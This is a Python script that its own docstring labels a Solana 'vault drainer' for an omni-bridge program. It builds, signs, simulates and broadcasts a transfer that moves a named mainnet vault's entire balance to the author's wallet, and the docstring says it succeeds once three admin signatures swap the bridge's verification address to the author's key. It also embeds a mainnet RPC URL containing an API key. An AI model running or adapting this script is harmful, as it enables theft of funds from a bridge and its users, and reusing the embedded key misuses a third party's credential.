#!/usr/bin/env python3
"""omni-bridge Solana vault drainer.

Template is fixed; only the signer matters. While `config.derived_near_bridge_address`
still holds the MPC key, `simulate` must stop at SignatureVerificationFailed (6000).
After 3 admin signatures swap that address to ours, the same bytes empty the vault.

usage:
  drain.py gen                 # create sol.json + secp.json, print our 64-byte bridge address
  drain.py build               # build instruction for the whole vault -> our wallet
  drain.py simulate            # simulate via RPC, expect Custom:6000 today
  drain.py send                # broadcast for real
options: --amount LAMPORTS --nonce N --to PUBKEY --fee-recipient STR
"""
import base64, hashlib, hmac, json, os, struct, sys, time, urllib.request

from solders.hash import Hash
from solders.instruction import AccountMeta, Instruction
from solders.message import Message
from solders.pubkey import Pubkey
from solders.signature import Signature
from solders.transaction import VersionedTransaction

PROG = "dahPEoZGXfyV58JqqH85okdHmpN8U2q8owgPUXSCPxe"
CONFIG = "2iANpDh96GgithLPTVMZjZFtnbrYBUCLqnEvaytbwTQq"
AUTHORITY = "FvULawNPGBbuwYus74ECaQoV1oH9Tk6XPN7VPN51NYds"
VAULT = "6tckHFBpiJ8YgYN8FUskvtvTpXQZ55g5LHeo1kvELoDQ"
BRIDGE = "2yVjuQwpsvdsrywzsJJVs9Ueh4zayyo5DYJbBNc3DDpn"
FEE_COLLECTOR = "9bFNrXNb2WTx8fMHXCheaZqkLZ3YCCaiqTftHxeintHy"
SEQUENCE = "79nePUUxtfJSdrkbririgL5YMaoEh5g4HNQaar2EuJ7"
MESSAGE = "4NKTVpUKP3Qn7nZtnZbuddr1CC8JYjqFhtEGDTsz4MKj"
CLOCK = "SysvarC1ock11111111111111111111111111111111"
RENT = "SysvarRent111111111111111111111111111111111"
WORMHOLE = "worm2ZoG2kUd4vFXhvjh93UUH596ayRfgQ2MgjNMTth"
SHIM = "EtZMZM22ViKMo4r5y4Anovs3wKQ2owUmDpjygnMMcdEX"
SHIM_EA = "HQS31aApX3DDkuXgSpV9XyDUNtFgQ31pUn5BNWHG2PSp"
SYSTEM = "11111111111111111111111111111111"
CBUDGET = "ComputeBudget111111111111111111111111111111"

DISC = bytes.fromhex("681b79450346d942")  # global:finalize_transfer_sol
PER_ACCOUNT = 1024
CHAIN_ID = 2
CHAIN_ORIGIN = 1

RPC = os.environ.get(
    "SOL_RPC", "https://mainnet.helius-rpc.com/?api-key=65fd2a43-ba10-4cc6-b748-f16725dae53b")
HERE = os.path.dirname(os.path.abspath(__file__))

# ---------------------------------------------------------------- base58
ALPHA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"


def b58d(s):
    n = 0
    for c in s:
        n = n * 58 + ALPHA.index(c)
    return b"\0" * (len(s) - len(s.lstrip("1"))) + n.to_bytes((n.bit_length() + 7) // 8, "big")


def b58e(h):
    n = int.from_bytes(h, "big")
    s = ""
    while n:
        n, r = divmod(n, 58)
        s = ALPHA[r] + s
    return "1" * (len(h) - len(h.lstrip(b"\0"))) + s


# ---------------------------------------------------------------- keccak
RC = [0x0000000000000001, 0x0000000000008082, 0x800000000000808A, 0x8000000080008000,
      0x000000000000808B, 0x0000000080000001, 0x8000000080008081, 0x8000000000008009,
      0x000000000000008A, 0x0000000000000088, 0x0000000080008009, 0x000000008000000A,
      0x000000008000808B, 0x800000000000008B, 0x8000000000008089, 0x8000000000008003,
      0x8000000000008002, 0x8000000000000080, 0x000000000000800A, 0x800000008000000A,
      0x8000000080008081, 0x8000000000008080, 0x0000000080000001, 0x8000000080008008]
ROT = [[0, 36, 3, 41, 18], [1, 44, 10, 45, 2], [62, 6, 43, 15, 61],
       [28, 55, 25, 21, 56], [27, 20, 39, 8, 14]]
M = (1 << 64) - 1


def _f(A):
    for rnd in range(24):
        C = [A[x][0] ^ A[x][1] ^ A[x][2] ^ A[x][3] ^ A[x][4] for x in range(5)]
        D = [C[(x - 1) % 5] ^ (((C[(x + 1) % 5] << 1) | (C[(x + 1) % 5] >> 63)) & M) for x in range(5)]
        for x in range(5):
            for y in range(5):
                A[x][y] ^= D[x]
        B = [[0] * 5 for _ in range(5)]
        for x in range(5):
            for y in range(5):
                r = ROT[x][y]
                v = A[x][y]
                B[y][(2 * x + 3 * y) % 5] = ((v << r) | (v >> (64 - r))) & M if r else v
        for x in range(5):
            for y in range(5):
                A[x][y] = B[x][y] ^ ((~B[(x + 1) % 5][y]) & B[(x + 2) % 5][y])
        A[0][0] ^= RC[rnd]
    return A


def keccak256(data):
    rate = 136
    p = bytearray(data) + b"\x01"
    p += b"\0" * ((rate - len(p) % rate) % rate)
    p[-1] |= 0x80
    A = [[0] * 5 for _ in range(5)]
    for off in range(0, len(p), rate):
        blk = p[off:off + rate]
        for i in range(rate // 8):
            x, y = i % 5, i // 5
            A[x][y] ^= struct.unpack_from("<Q", blk, i * 8)[0]
        A = _f(A)
    out = b"".join(struct.pack("<Q", A[i % 5][i // 5]) for i in range(4))
    return out


# ---------------------------------------------------------------- secp256k1
P = 2**256 - 2**32 - 977
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
EP = 2**255 - 19
G = (0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
     0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)


def p_add(a, b):
    if a is None:
        return b
    if b is None:
        return a
    if a[0] == b[0] and (a[1] + b[1]) % P == 0:
        return None
    l = ((3 * a[0] * a[0] if a == b else b[1] - a[1]) *
         pow((2 * a[1]) % P if a == b else (b[0] - a[0]) % P, P - 2, P)) % P
    x = (l * l - a[0] - b[0]) % P
    return (x, (l * (a[0] - x) - a[1]) % P)


def p_mul(k, a):
    r = None
    while k:
        if k & 1:
            r = p_add(r, a)
        a = p_add(a, a)
        k >>= 1
    return r


def p_dec(x, yb):
    y = pow((x * x * x + 7) % P, (P + 1) // 4, P)
    if y % 2 != yb:
        y = P - y
    return (x, y)


def secp_priv():
    d = int.from_bytes(hashlib.sha256(os.urandom(32)).digest(), "big") % N
    return d


def secp_pub(d):
    x, y = p_mul(d, G)
    return x.to_bytes(32, "big") + y.to_bytes(32, "big")


def rfc6979(d, h):
    x = d.to_bytes(32, "big")
    v, k = b"\x01" * 32, b"\x00" * 32
    k = hmac.new(k, v + b"\x00" + x + h, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    k = hmac.new(k, v + b"\x01" + x + h, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    while True:
        v = hmac.new(k, v, hashlib.sha256).digest()
        cand = int.from_bytes(v, "big")
        if 0 < cand < N:
            return cand
        k = hmac.new(k, v + b"\x00", hashlib.sha256).digest()
        v = hmac.new(k, v, hashlib.sha256).digest()


def secp_sign(d, msg):
    """returns 65 bytes r||s||recid, low-S, recid in 0..3"""
    h = keccak256(msg)
    hi = int.from_bytes(h, "big") % N
    k = rfc6979(d, h)
    R = p_mul(k, G)
    r = R[0] % N
    s = (pow(k, N - 2, N) * (hi + r * d)) % N
    recid = (R[1] & 1) | (2 if R[0] >= N else 0)
    if s > N // 2:
        s = N - s
        recid ^= 1
    return r.to_bytes(32, "big") + s.to_bytes(32, "big") + bytes([recid])


def secp_recover(h, sig):
    r = int.from_bytes(sig[:32], "big")
    s = int.from_bytes(sig[32:64], "big")
    v = sig[64]
    x = r + (v // 2) * N
    if x >= P:
        return None
    R = p_dec(x, v & 1)
    hi = int.from_bytes(h, "big") % N
    Q = p_mul(pow(r, N - 2, N), p_add(p_mul(s, R), p_mul((-hi) % N, G)))
    if Q is None:
        return None
    return Q[0].to_bytes(32, "big") + Q[1].to_bytes(32, "big")


# ---------------------------------------------------------------- ed25519 pda
def _ed_on(x_bytes):
    y = int.from_bytes(x_bytes, "little") & ((1 << 255) - 1)
    if y >= EP:
        return False
    d = (-121665 * pow(121666, EP - 2, EP)) % EP
    u = (y * y - 1) % EP
    v = (d * y * y + 1) % EP
    x2 = u * pow(v, EP - 2, EP) % EP
    if x2 == 0:
        return True
    x = pow(x2, (EP + 3) // 8, EP)
    if (x * x - x2) % EP != 0:
        x = x * pow(2, (EP - 1) // 4, EP) % EP
    return (x * x - x2) % EP == 0


def find_pda(seeds, program):
    for bump in range(255, -1, -1):
        h = hashlib.sha256(b"".join(seeds) + bytes([bump]) + b58d(program) + b"ProgramDerivedAddress").digest()
        if not _ed_on(h):
            return b58e(h), bump
    raise RuntimeError("no pda")


# ---------------------------------------------------------------- payload
def signed_message(nonce, origin_nonce, amount, recipient32, fee):
    m = bytearray([0x00])
    m += struct.pack("<Q", nonce)
    m += bytes([CHAIN_ORIGIN]) + struct.pack("<Q", origin_nonce)
    m += bytes([CHAIN_ID]) + bytes(32)
    m += amount.to_bytes(16, "little")
    m += bytes([CHAIN_ID]) + recipient32
    if fee:
        m += b"\x01" + struct.pack("<I", len(fee)) + fee.encode()
    else:
        m += b"\x00"
    return bytes(m)


def load(name):
    p = os.path.join(HERE, name)
    return json.load(open(p)) if os.path.exists(p) else None


def rpc(method, params):
    req = urllib.request.Request(RPC, json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode(),
                                 {"content-type": "application/json"})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)


def build(amount=None, nonce=None, to=None, fee=None, payer=None):
    sol = load("sol.json")
    secp = load("secp.json")
    if not sol or not secp:
        sys.exit("run: drain.py gen")
    d = int(secp["d"], 16)
    me = b58d(sol["pubkey"])
    who = b58d(payer) if payer else me
    recipient = b58d(to) if to else me
    if nonce is None:
        cfg = rpc("getAccountInfo", [CONFIG, {"encoding": "base64"}])["result"]["value"]
        nonce = struct.unpack_from("<Q", base64.b64decode(cfg["data"][0]), 40)[0] + 1
    if amount is None:
        amount = rpc("getBalance", [VAULT])["result"]["value"]
    origin_nonce = nonce
    msg = signed_message(nonce, origin_nonce, amount, recipient, fee)
    sig = secp_sign(d, msg)
    assert secp_recover(keccak256(msg), sig) == bytes.fromhex(secp["pub"])
    used, _ = find_pda([b"used_nonces", struct.pack("<Q", nonce // PER_ACCOUNT)], PROG)
    # trailing relayer_state PDA: ignored by the live program, required once
    # PR 659 (trusted relayers) is deployed
    relayer, _ = find_pda([b"relayer", who], PROG)
    keys = [(CONFIG, 1), (used, 1), (AUTHORITY, 1), (b58e(recipient), 1), (VAULT, 1),
            (CONFIG, 1), (BRIDGE, 1), (FEE_COLLECTOR, 1), (SEQUENCE, 1), (MESSAGE, 1),
            (b58e(who), 1), (CLOCK, 0), (RENT, 0), (WORMHOLE, 0), (SYSTEM, 0),
            (SHIM, 0), (SHIM_EA, 0), (SYSTEM, 0), (relayer, 0)]
    data = DISC + struct.pack("<Q", nonce) + bytes([CHAIN_ORIGIN]) + struct.pack("<Q", origin_nonce) \
        + amount.to_bytes(16, "little") + (b"\x01" + struct.pack("<I", len(fee)) + fee.encode() if fee else b"\x00") + sig
    return {"keys": keys, "data": data, "me": me, "who": who, "msg": msg, "sig": sig,
            "nonce": nonce, "amount": amount, "recipient": b58e(recipient)}


def tx_bytes(b, blockhash=None):
    me58 = b58e(b["who"])
    metas = [AccountMeta(Pubkey.from_string(k), k == me58, bool(w)) for k, w in b["keys"]]
    ix = Instruction(Pubkey.from_string(PROG), b["data"], metas)
    payer = Pubkey.from_bytes(b["who"])
    bh = Hash.from_string(blockhash) if blockhash else Hash.default()
    msg = Message.new_with_blockhash([ix], payer, bh)
    sigs = [Signature.default()] * msg.header.num_required_signatures
    return bytes(VersionedTransaction.populate(msg, sigs))


def main():
    args = sys.argv[1:]
    cmd = args[0] if args else "build"
    opt = {}
    it = iter(args[1:])
    for a in it:
        if a.startswith("--"):
            opt[a[2:]] = next(it, "")
    if cmd == "gen":
        d = secp_priv()
        pub = secp_pub(d)
        ed = hashlib.sha256(os.urandom(32)).digest()
        json.dump({"d": d.to_bytes(32, "big").hex(), "pub": pub.hex()}, open(os.path.join(HERE, "secp.json"), "w"))
        json.dump({"seed": ed.hex(), "pubkey": b58e(ed)}, open(os.path.join(HERE, "sol.json"), "w"))
        print("sol wallet   ", b58e(ed))
        print("bridge addr  ", pub.hex())
        return
    b = build(int(opt["amount"]) if "amount" in opt else None,
              int(opt["nonce"]) if "nonce" in opt else None,
              opt.get("to"), opt.get("fee-recipient") or None,
              opt.get("payer") or (None if cmd == "send" else "BZ2jjv7P1JD5mTzAWqKa9h4HeGsKqpgZAS6heUsDYwBV"))
    print("nonce", b["nonce"], "amount", b["amount"], "->", b["recipient"], "datalen", len(b["data"]))
    if cmd == "build":
        print("signed msg", b["msg"].hex())
        print("sig", b["sig"].hex())
        return
    if cmd == "send":
        from solders.keypair import Keypair
        kp = Keypair.from_seed(bytes.fromhex(load("sol.json")["seed"]))
        if b58e(bytes(kp.pubkey())) != load("sol.json")["pubkey"]:
            sys.exit("sol.json seed/pubkey mismatch")
        bal = rpc("getBalance", [b58e(b["who"])])["result"]["value"]
        if bal < 20_000_000:
            sys.exit(f"payer {b58e(b['who'])} has {bal} lamports, fund it (0.02 SOL = 10 tries)")
        bh = rpc("getLatestBlockhash", [{"commitment": "finalized"}])["result"]["value"]["blockhash"]
        metas = [AccountMeta(Pubkey.from_string(k), k == b58e(b["who"]), bool(w)) for k, w in b["keys"]]
        pre = []
        cu = int(opt.get("cu-price") or 50_000)
        pre.append(Instruction(Pubkey.from_string(CBUDGET),
                               (3).to_bytes(1, "little") + cu.to_bytes(8, "little"), []))
        raw = None
        for attempt in range(3):
            try:
                msg = Message.new_with_blockhash(pre + [Instruction(Pubkey.from_string(PROG), b["data"], metas)],
                                                Pubkey.from_bytes(b["who"]), Hash.from_string(bh))
                raw = bytes(VersionedTransaction(msg, [kp]))
                print("sending", len(raw), "bytes, cu-price", cu)
                sig = rpc("sendTransaction", [base64.b64encode(raw).decode(),
                                              {"encoding": "base64", "skipPreflight": False}])["result"]
                break
            except Exception as e:
                raw = None
                print("send failed:", e)
                if attempt == 2:
                    sys.exit(1)
                bh = rpc("getLatestBlockhash", [{"commitment": "finalized"}])["result"]["value"]["blockhash"]
        print("sig", sig)
        for _ in range(40):
            st = rpc("getSignatureStatuses", [[sig]])["result"]["value"][0]
            if st and st.get("confirmationStatus"):
                print(json.dumps({"slot": st["slot"], "status": st["confirmationStatus"],
                                  "err": st.get("err")}))
                print("balance now", rpc("getBalance", [b58e(b["who"])])["result"]["value"])
                return sys.exit(0 if not st.get("err") else 1)
            time.sleep(1.5)
        print("unconfirmed after 60s")
        return sys.exit(1)
    raw = tx_bytes(b)
    r = rpc("simulateTransaction", [base64.b64encode(raw).decode(),
                                    {"encoding": "base64", "sigVerify": False, "replaceRecentBlockhash": True}])
    v = (r.get("result") or {}).get("value") or {}
    print(json.dumps(v.get("err")))
    for l in (v.get("logs") or [])[-4:]:
        print(l)


if __name__ == "__main__":
    main()
